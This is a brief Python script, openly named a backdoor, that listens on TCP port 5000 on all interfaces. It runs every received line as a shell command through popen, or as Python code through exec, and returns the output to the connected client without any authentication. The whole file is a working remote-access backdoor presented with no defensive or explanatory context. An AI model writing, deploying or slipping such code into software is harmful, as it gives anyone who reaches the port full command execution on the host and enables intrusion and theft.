#-*-coding: utf-8-*-
from socket import *
from os import popen, chdir, getcwd

class Backdoor():
	def __init__(self, ip="0.0.0.0",port=5000,l=1):
		sock = socket(AF_INET, SOCK_STREAM)
		sock.bind((ip, port))
		sock.listen(l)
		conn, addr = sock.accept()
		while True:
			cmd = conn.recv(1024).decode()
			if cmd[:2].lower() == "cd":
				try:
					chdir(cmd[3:])
				except Exception as e:
					conn.send(str(e).encode())
				finally:
					conn.send(str(getcwd()).encode())
			elif cmd[:6].lower() == "python":
				try:
					exec(cmd[7:])
				except Exception as e:
					conn.send(str(e).encode())
			else:
				out = popen(cmd).read()
				conn.send(out.encode())


if __name__ == '__main__':
	main = Backdoor()